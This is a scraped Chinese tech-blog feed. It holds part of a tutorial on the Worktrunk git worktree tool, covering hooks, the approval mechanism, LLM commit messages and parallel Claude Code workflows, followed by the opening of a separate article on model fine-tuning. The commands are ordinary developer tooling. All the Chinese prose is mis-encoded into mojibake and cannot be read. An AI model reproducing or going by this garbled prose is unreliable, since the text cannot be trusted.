<p><strong>post-switch</strong> - æ¯æ¬¡ <code>wt switch</code> ååœ¨åå°æ‰§è¡Œ(æ— è®ºæ˜¯æ–°å»ºã€åˆ‡æ¢è¿˜æ˜¯åˆ‡åˆ°å½“å‰):</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">post-switch</span> = <span class="hljs-string">"echo 'Switched to {{ branch }}'"</span>
</code></pre>
<p><strong>pre-commit</strong> - merge æ—¶æäº¤å‰æ‰§è¡Œ,å¤±è´¥å³åœ:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[pre-commit]</span>
<span class="hljs-attr">format</span> = <span class="hljs-string">"cargo fmt -- --check"</span>       <span class="hljs-comment"># ä»£ç æ ¼å¼æ£€æŸ¥</span>
<span class="hljs-attr">lint</span> = <span class="hljs-string">"cargo clippy -- -D warnings"</span>  <span class="hljs-comment"># Lint æ£€æŸ¥</span>
</code></pre>
<p><strong>pre-merge</strong> - åˆå¹¶åˆ°ç›®æ ‡åˆ†æ”¯å‰æ‰§è¡Œ,å¤±è´¥å³åœ:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[pre-merge]</span>
<span class="hljs-attr">test</span> = <span class="hljs-string">"cargo test"</span>                   <span class="hljs-comment"># è¿è¡Œæµ‹è¯•</span>
<span class="hljs-attr">build</span> = <span class="hljs-string">"cargo build --release"</span>       <span class="hljs-comment"># ç”Ÿäº§æ„å»º</span>
</code></pre>
<p><strong>post-merge</strong> - åˆå¹¶æˆåŠŸååœ¨ç›®æ ‡åˆ†æ”¯çš„ worktree æ‰§è¡Œ(å¦‚æœå­˜åœ¨),å¦åˆ™åœ¨ä¸» worktree æ‰§è¡Œ:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">post-merge</span> = <span class="hljs-string">"cargo install --path ."</span>
</code></pre>
<p><strong>pre-remove</strong> - worktree åˆ é™¤å‰æ‰§è¡Œ,å¤±è´¥å³åœ:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[pre-remove]</span>
<span class="hljs-attr">cleanup</span> = <span class="hljs-string">"rm -rf /tmp/cache/{{ branch }}"</span>
</code></pre>
<h3 data-id="heading-16">æ¨¡æ¿å˜é‡</h3>
<p>Hook å‘½ä»¤æ”¯æŒæ¨¡æ¿å˜é‡,è¿è¡Œæ—¶è‡ªåŠ¨å±•å¼€:</p>






































































<table><thead><tr><th>å˜é‡</th><th>ç¤ºä¾‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>{{ repo }}</code></td><td>my-project</td><td>ä»“åº“å</td></tr><tr><td><code>{{ branch }}</code></td><td>feature-foo</td><td>åˆ†æ”¯å</td></tr><tr><td><code>{{ worktree }}</code></td><td>/path/to/worktree</td><td>worktree ç»å¯¹è·¯å¾„</td></tr><tr><td><code>{{ worktree_name }}</code></td><td>my-project.feature-foo</td><td>worktree ç›®å½•å</td></tr><tr><td><code>{{ repo_root }}</code></td><td>/path/to/main</td><td>ä¸»ä»“åº“æ ¹è·¯å¾„</td></tr><tr><td><code>{{ default_branch }}</code></td><td>main</td><td>é»˜è®¤åˆ†æ”¯å</td></tr><tr><td><code>{{ commit }}</code></td><td>a1b2c3d4e5f6...</td><td>HEAD å®Œæ•´ SHA</td></tr><tr><td><code>{{ short_commit }}</code></td><td>a1b2c3d</td><td>HEAD çŸ­ SHA</td></tr><tr><td><code>{{ remote }}</code></td><td>origin</td><td>ä¸»è¿œç¨‹åç§°</td></tr><tr><td><code>{{ remote_url }}</code></td><td><a href="https://link.juejin.cn?target=mailto%3Agit%40github.com" target="_blank" title="mailto:git@github.com" ref="nofollow noopener noreferrer">git@github.com</a>:user/repo.git</td><td>è¿œç¨‹ URL</td></tr><tr><td><code>{{ upstream }}</code></td><td>origin/feature</td><td>ä¸Šæ¸¸è·Ÿè¸ªåˆ†æ”¯</td></tr><tr><td><code>{{ target }}</code></td><td>main</td><td>ç›®æ ‡åˆ†æ”¯(ä»… merge hooks)</td></tr></tbody></table>
<h3 data-id="heading-17">å®‰å…¨æœºåˆ¶</h3>
<p>é¡¹ç›® hook(<code>.config/wt.toml</code>)é¦–æ¬¡è¿è¡Œéœ€è¦ç”¨æˆ·æ‰¹å‡†:</p>
<pre><code class="hljs language-plain" lang="plain">â–² repo needs approval to execute 3 commands:
â—‹ post-create install:
  echo 'Installing dependencies...'
â¯ Allow and remember? [y/N]
</code></pre>
<ul>
<li>æ‰¹å‡†è®°å½•ä¿å­˜åœ¨ç”¨æˆ·é…ç½®ä¸­</li>
<li>å‘½ä»¤å˜æ›´éœ€è¦é‡æ–°æ‰¹å‡†</li>
<li><code>--yes</code> è·³è¿‡æç¤º(é€‚ç”¨äº CI)</li>
<li><code>--no-verify</code> å®Œå…¨è·³è¿‡ hooks</li>
</ul>
<p>ç®¡ç†æ‰¹å‡†è®°å½•:</p>
<pre><code class="hljs language-bash" lang="bash">wt hook approvals add      <span class="hljs-comment"># é¢„æ‰¹å‡†å½“å‰é¡¹ç›®æ‰€æœ‰å‘½ä»¤</span>
wt hook approvals clear    <span class="hljs-comment"># æ¸…é™¤å½“å‰é¡¹ç›®æ‰¹å‡†</span>
wt hook approvals clear --global  <span class="hljs-comment"># æ¸…é™¤å…¨å±€æ‰¹å‡†</span>
</code></pre>
<h3 data-id="heading-18">ç”¨æˆ·çº§ Hooks</h3>
<p>åœ¨ <code>~/.config/worktrunk/config.toml</code> ä¸­é…ç½®çš„ hook ä¼šå¯¹æ‰€æœ‰ä»“åº“ç”Ÿæ•ˆ,ä¸”ä¸éœ€è¦æ‰¹å‡†:</p>






























<table><thead><tr><th>ç»´åº¦</th><th>é¡¹ç›® hook</th><th>ç”¨æˆ· hook</th></tr></thead><tbody><tr><td>é…ç½®ä½ç½®</td><td><code>.config/wt.toml</code></td><td><code>~/.config/worktrunk/config.toml</code></td></tr><tr><td>ä½œç”¨èŒƒå›´</td><td>å•ä¸ªä»“åº“</td><td>æ‰€æœ‰ä»“åº“</td></tr><tr><td>éœ€è¦æ‰¹å‡†</td><td>æ˜¯</td><td>å¦</td></tr><tr><td>æ‰§è¡Œé¡ºåº</td><td>åæ‰§è¡Œ</td><td>å…ˆæ‰§è¡Œ</td></tr></tbody></table>
<p>æˆ‘è§‰å¾—çœ‹ä¸‹æ¥ï¼Œè¿™ä¸ª hook éå¸¸é‡è¦ï¼Œå¯ä»¥<strong>å¤ç”¨ä¸» worktree çš„ç¼“å­˜</strong>:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[post-create]</span>
<span class="hljs-comment"># è½¯é“¾æ¥ node_modules é¿å…é‡å¤å®‰è£…</span>
<span class="hljs-attr">cache</span> = <span class="hljs-string">"ln -sf {{ repo_root }}/node_modules node_modules"</span>
<span class="hljs-attr">env</span> = <span class="hljs-string">"cp {{ repo_root }}/.env.local .env"</span>
</code></pre>
<h3 data-id="heading-19">ç‹¬ç«‹è¿è¡Œ Hooks</h3>
<p>é™¤äº†è‡ªåŠ¨è§¦å‘,ä¹Ÿå¯ä»¥æ‰‹åŠ¨è¿è¡Œ hook è¿›è¡Œæµ‹è¯•æˆ–é‡è¯•:</p>
<pre><code class="hljs language-bash" lang="bash">wt hook pre-merge           <span class="hljs-comment"># è¿è¡Œ pre-merge hooks</span>
wt hook pre-merge --<span class="hljs-built_in">yes</span>     <span class="hljs-comment"># è·³è¿‡æ‰¹å‡†æç¤º(é€‚ç”¨äº CI)</span>
wt hook show                <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å·²é…ç½®çš„ hooks</span>
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: Hook å¼€å‘æµ‹è¯•ã€CI æµæ°´çº¿ã€å¤±è´¥åé‡è¯•ç­‰ã€‚</p>
<h3 data-id="heading-20">Claude Code æ’ä»¶ç›‘æµ‹çŠ¶æ€</h3>
<pre><code class="hljs language-bash" lang="bash">claude plugin marketplace add max-sixty/worktrunk
claude plugin install worktrunk@worktrunk
</code></pre>
<h4 data-id="heading-21">æ‰‹åŠ¨è®¾ç½®çŠ¶æ€æ ‡è®°</h4>
<p>é™¤äº†è‡ªåŠ¨è¿½è¸ª Claude çŠ¶æ€,ä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç»™ worktree è®¾ç½®ä»»ä½•æ ‡è®°ï¼Œç”¨äºå…¶ä»–å·¥ä½œæµï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç»™å½“å‰åˆ†æ”¯è®¾ç½®æ ‡è®°</span>
wt config state marker <span class="hljs-built_in">set</span> <span class="hljs-string">"ğŸš§"</span>

<span class="hljs-comment"># ç»™æŒ‡å®šåˆ†æ”¯è®¾ç½®æ ‡è®°</span>
wt config state marker <span class="hljs-built_in">set</span> <span class="hljs-string">"âœ…"</span> --branch feature

<span class="hljs-comment"># ç›´æ¥æ“ä½œ Git Config (é«˜çº§ç”¨æ³•)</span>
git config worktrunk.state.feature.marker <span class="hljs-string">'{"marker":"ğŸ’¬","set_at":0}'</span>
</code></pre>
<h4 data-id="heading-22">Statusline çŠ¶æ€æ </h4>
<p><code>wt list statusline --claude-code</code> å¯ä»¥è¾“å‡ºä¸€è¡Œç´§å‡‘çš„çŠ¶æ€ä¿¡æ¯,ç”¨äº Claude Code çš„çŠ¶æ€æ æ˜¾ç¤º:</p>
<pre><code class="hljs language-plain" lang="plain">~/w/myproject.feature-auth !ğŸ¤– @+42 -8 â†‘3 â‡¡1 â— | Opus
</code></pre>
<h2 data-id="heading-23">LLM Commit Messages è‡ªåŠ¨ç”Ÿæˆæäº¤ä¿¡æ¯</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fllm-commits%2F" target="_blank" title="https://worktrunk.dev/llm-commits/" ref="nofollow noopener noreferrer">LLM Commit Messages | Worktrunk</a></p>
<p>Worktrunk å¯ä»¥è°ƒç”¨ LLM è‡ªåŠ¨ç”Ÿæˆ commit messageï¼Œé›†æˆåœ¨ <code>wt merge</code>ã€<code>wt step commit</code>ã€<code>wt step squash</code> ç­‰å‘½ä»¤ä¸­ã€‚</p>
<p>ä¸é…ç½®ä¹Ÿèƒ½ç”¨ï¼Œé»˜è®¤ä¼šåŸºäºæ–‡ä»¶åç”Ÿæˆç®€å•çš„ messageï¼Œä½†é…ç½® LLM åèƒ½ç”Ÿæˆæ›´æœ‰æ„ä¹‰çš„æäº¤ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-24">å®‰è£…ä¸é…ç½®</h3>
<p><strong>1. å®‰è£… llm å·¥å…·</strong></p>
<p>ä½¿ç”¨çš„æ˜¯ <a href="https://link.juejin.cn?target=https%3A%2F%2Fllm.datasette.io%2F" target="_blank" title="https://llm.datasette.io/" ref="nofollow noopener noreferrer">llm</a>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">uv tool install -U llm
<span class="hljs-comment"># æˆ–è€…ç›´æ¥ brew</span>
brew install llm
</code></pre>
<p><strong>2. é…ç½® API Key</strong></p>
<p>é€‰æ‹©ä½ å–œæ¬¢çš„ LLM æä¾›å•†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ Claude (æ¨è)</span>
llm install llm-anthropic
llm keys <span class="hljs-built_in">set</span> anthropic
<span class="hljs-comment"># è¾“å…¥ä½ çš„ Anthropic API Key</span>

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨ OpenAI</span>
llm keys <span class="hljs-built_in">set</span> openai
<span class="hljs-comment"># è¾“å…¥ä½ çš„ OpenAI API Key</span>
</code></pre>
<p><strong>3. é…ç½® Worktrunk</strong></p>
<p>åˆ›å»ºé…ç½®æ–‡ä»¶ï¼ˆå¦‚æœè¿˜æ²¡æœ‰ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">wt config create
</code></pre>
<p>ç¼–è¾‘ <code>~/.config/worktrunk/config.toml</code>ï¼Œæ·»åŠ ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[commit-generation]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"llm"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-m"</span>, <span class="hljs-string">"claude-3-5-haiku-latest"</span>]  <span class="hljs-comment"># æˆ– gpt-4o-mini</span>
</code></pre>
<h3 data-id="heading-25">ä½¿ç”¨åœºæ™¯</h3>
<p>é…ç½®å®Œæˆåï¼Œä»¥ä¸‹å‘½ä»¤ä¼šè‡ªåŠ¨ç”Ÿæˆ commit messageï¼š</p>
<p><strong>åœºæ™¯ 1: åˆå¹¶åˆ†æ”¯æ—¶ç”Ÿæˆ squash commit</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ wt merge
â— Squashing 3 commits into a single commit (5 files, +48)...
â— Generating squash commit message...
   feat(auth): Implement JWT authentication system

   - Add JWT token generation and validation
   - Implement refresh token mechanism
   - Add middleware <span class="hljs-keyword">for</span> protected routes
</code></pre>
<p><strong>åœºæ™¯ 2: æäº¤å½“å‰å˜æ›´</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ wt step commit
â— Generating commit message...
   fix(api): Handle null response <span class="hljs-keyword">in</span> user endpoint
</code></pre>
<p><strong>åœºæ™¯ 3: æŠŠå¤šä¸ª commit å‹ç¼©æˆä¸€ä¸ª</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ wt step squash
â— Squashing 5 commits...
â— Generating squash commit message...
   refactor(ui): Modernize component architecture
</code></pre>
<h3 data-id="heading-26">ä½¿ç”¨å…¶ä»– AI å·¥å…·</h3>
<p>é™¤äº† <code>llm</code>ï¼Œä»»ä½•èƒ½ä» stdin è¯»å–æç¤ºè¯å¹¶è¾“å‡ºæ–‡æœ¬çš„å·¥å…·éƒ½è¡Œï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-comment"># ä½¿ç”¨ aichat</span>
<span class="hljs-section">[commit-generation]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"aichat"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-m"</span>, <span class="hljs-string">"claude:claude-3-5-haiku-latest"</span>]

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰è„šæœ¬</span>
<span class="hljs-section">[commit-generation]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"./scripts/generate-commit.sh"</span>
</code></pre>
<h3 data-id="heading-27">Fallback è¡Œä¸º</h3>
<p>å¦‚æœæ²¡é…ç½® LLMï¼ŒWorktrunk ä¼šç”ŸæˆåŸºäºæ–‡ä»¶åçš„ç®€å• messageï¼š</p>
<pre><code class="hljs language-plain" lang="plain">Changes to auth.rs &amp; config.rs
</code></pre>
<h2 data-id="heading-28">CI çŠ¶æ€é›†æˆ</h2>
<p>å¦‚æœä½ ç”¨ GitHub Actions,Worktrunk å¯ä»¥åœ¨ <code>wt list</code> é‡Œæ˜¾ç¤ºæ„å»ºçŠ¶æ€:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é…ç½® GitHub Token</span>
wt config github.token <span class="hljs-string">"ghp_xxxxxxxxxxxx"</span>

<span class="hljs-comment"># ä¹‹å wt list å°±ä¼šæ˜¾ç¤º CI çŠ¶æ€</span>
wt list
</code></pre>
<h2 data-id="heading-29">å®æˆ˜å·¥ä½œæµ</h2>
<h3 data-id="heading-30">å¹¶è¡Œè·‘å¤šä¸ª Claude Code</h3>
<p>å‡è®¾ä½ åœ¨ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fzellij.dev%2F" target="_blank" title="https://zellij.dev/" ref="nofollow noopener noreferrer">Zellij</a> æˆ– Tmux ç®¡ç†å¤šä¸ªç»ˆç«¯çª—å£:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Pane 1: ä¿® bug</span>
wt switch -c -x claude fix-login-bug

<span class="hljs-comment"># Pane 2: é‡æ„</span>
wt switch -c -x claude refactor-utils

<span class="hljs-comment"># Pane 3: æ–°åŠŸèƒ½</span>
wt switch -c -x claude feat-export
</code></pre>
<p>æ¯ä¸ª Claude åœ¨ç‹¬ç«‹ç›®å½•é‡Œå·¥ä½œ,ä½ å¯ä»¥éšæ—¶åˆ‡å›ä¸»ç›®å½•çœ‹å…¨å±€çŠ¶æ€:</p>
<pre><code class="hljs language-bash" lang="bash">wt switch main
wt list
</code></pre>
<h3 data-id="heading-31">ä¸´æ—¶éªŒè¯æƒ³æ³•</h3>
<p>æœ‰æ—¶å€™ä½ æƒ³å¿«é€ŸéªŒè¯ä¸€ä¸ªæƒ³æ³•,ä½†ä¸æƒ³æ±¡æŸ“å½“å‰åˆ†æ”¯:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºä¸´æ—¶ worktree</span>
wt switch -c -x code experiment

<span class="hljs-comment"># éªŒè¯å®Œæ¯•,ç›´æ¥åˆ æ‰</span>
wt remove
</code></pre>
<p>å› ä¸º worktree æ˜¯ç‹¬ç«‹ç›®å½•,åˆ æ‰ä¸ä¼šå½±å“å…¶ä»–åˆ†æ”¯ã€‚</p>
<h3 data-id="heading-32">Review PR æ—¶è·‘ä»£ç </h3>
<p>æœ‰ PR æ¥äº†,ä½ æƒ³åœ¨æœ¬åœ°è·‘ä¸€ä¸‹ä»£ç :</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸºäº PR åˆ†æ”¯åˆ›å»º worktree</span>
wt switch -c review-pr-123 -b origin/pr-123

<span class="hljs-comment"># è£…ä¾èµ–ã€è·‘æµ‹è¯•</span>
npm install
npm run <span class="hljs-built_in">test</span>

<span class="hljs-comment"># Review å®Œæ¯•,æ¸…ç†</span>
wt remove
</code></pre>
<h2 data-id="heading-33">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2F" target="_blank" title="https://worktrunk.dev/" ref="nofollow noopener noreferrer">Worktrunk å®˜ç½‘</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fclaude-code-best-practices" target="_blank" title="https://www.anthropic.com/engineering/claude-code-best-practices" ref="nofollow noopener noreferrer">Anthropic - Claude Code Best Practices</a> (å®˜æ–¹æ¨èçš„ worktree å·¥ä½œæµ)</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fincident.io%2Fblog%2Fshipping-faster-with-claude-code-and-git-worktrees" target="_blank" title="https://incident.io/blog/shipping-faster-with-claude-code-and-git-worktrees" ref="nofollow noopener noreferrer">incident.io - Shipping faster with Claude Code and Git Worktrees</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgit-scm.com%2Fdocs%2Fgit-worktree" target="_blank" title="https://git-scm.com/docs/git-worktree" ref="nofollow noopener noreferrer">Git Worktree å®˜æ–¹æ–‡æ¡£</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®è°ƒæ–¹æ³•å­¦ä¹ æ€»ç»“(ä¸‡å­—é•¿æ–‡ï¼)]]></title>    <link>https://juejin.cn/post/7589903499599462454</link>    <guid>https://juejin.cn/post/7589903499599462454</guid>    <pubDate>2026-01-01T10:08:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599462454" data-draft-id="7589893746080743465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®è°ƒæ–¹æ³•å­¦ä¹ æ€»ç»“(ä¸‡å­—é•¿æ–‡ï¼)"/> <meta itemprop="keywords" content="ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-01T10:08:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŸ®äººä¸‰ç­‰"/> <meta itemprop="url" content="https://juejin.cn/user/4350105576808472"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®è°ƒæ–¹æ³•å­¦ä¹ æ€»ç»“(ä¸‡å­—é•¿æ–‡ï¼)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4350105576808472/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŸ®äººä¸‰ç­‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:08:04.000Z" title="Thu Jan 01 2026 10:08:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»38åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">1 ä»€ä¹ˆæ˜¯å¾®è°ƒï¼Ÿ</h4>
<ul>
<li>å¾®è°ƒæ˜¯åŸºäºå·²è®­ç»ƒå¥½çš„æ¨¡å‹ï¼ˆé€šå¸¸æ˜¯å¤§å‹é¢„è®­ç»ƒæ¨¡å‹ï¼‰ä½œä¸ºåŸºç¡€ï¼Œåœ¨æ–°çš„æ•°æ®é›†ä¸Šè¿›ä¸€æ­¥è®­ç»ƒæ¨¡å‹ï¼Œä»¥é€‚åº”ç‰¹å®šåº”ç”¨åœºæ™¯</li>
<li>éå¿…è¦ä¸å¾®è°ƒï¼š
<ul>
<li>æˆæœ¬é«˜:éœ€è¦å¤§é‡GPUèµ„æºå’Œæ—¶é—´</li>
<li>æŠ€æœ¯é—¨æ§›é«˜:éœ€è¦æ‡‚æœºå™¨å­¦ä¹ ã€æ•°æ®å¤„ç†ã€æ¨¡å‹è®­ç»ƒ</li>
<li>æ•°æ®è¦æ±‚ä¸¥æ ¼:éœ€è¦é«˜è´¨é‡ã€å¤§é‡çš„è®­ç»ƒæ•°æ®</li>
<li>ç»´æŠ¤å¤æ‚:æ¨¡å‹æ›´æ–°åéœ€è¦é‡æ–°å¾®è°ƒ</li>
</ul>
</li>
</ul>
<h4 data-id="heading-1">2 ä¸ºä»€ä¹ˆè¦å¾®è°ƒï¼Ÿ</h4>
<ul>
<li>é¢„è®­ç»ƒæ¨¡å‹æ˜¯ â€œé€šç”¨å­¦ä¹ ï¼Œæ™®è€Œä¸ç²¾â€ï¼Œå¾®è°ƒå¯ä»¥å°†å¤„ç†é€šç”¨ä»»åŠ¡çš„èƒ½åŠ›åœ¨ç‰¹å®šé¢†åŸŸä¸Šå¢å¼º</li>
<li>å¼¥è¡¥é¢„è®­ç»ƒçš„ â€œçŸ¥è¯†æ»åâ€ï¼Œé¢„è®­ç»ƒæ¨¡å‹æœ‰ â€œçŸ¥è¯†æˆªæ­¢æ—¥æœŸâ€ï¼ˆæ¯”å¦‚ GPT-4 æˆªæ­¢ 2023 å¹´ï¼‰ï¼Œæ²¡æ³•çŸ¥é“æœ€æ–°ä¿¡æ¯ï¼ˆæ¯”å¦‚ 2025 å¹´æ–°æ³•è§„ã€æ–°äº§å“ï¼‰ï¼›é€šè¿‡å¾®è°ƒçŒå…¥æœ€æ–°æ•°æ®ï¼Œå°±èƒ½è®©æ¨¡å‹æŒæ¡å®æ—¶çŸ¥è¯†ï¼Œä¸ç”¨ç­‰æ¨¡å‹é‡æ–°é¢„è®­ç»ƒã€‚</li>
<li>æ•°æ®å®‰å…¨æ–¹é¢ï¼šå¾ˆå¤šä¼ä¸šæ•°æ®ä¸èƒ½å¤–ä¼ ï¼Œæ²¡æ³•ç”¨å…¬æœ‰äº‘å¤§æ¨¡å‹ï¼›å¾®è°ƒå¯ä»¥æŠŠé¢„è®­ç»ƒæ¨¡å‹éƒ¨ç½²åœ¨æœ¬åœ°ï¼Œç”¨ç§æœ‰æ•°æ®å¾®è°ƒï¼Œå…¨ç¨‹æ•°æ®ä¸å¤–æµï¼Œç¬¦åˆåˆè§„è¦æ±‚</li>
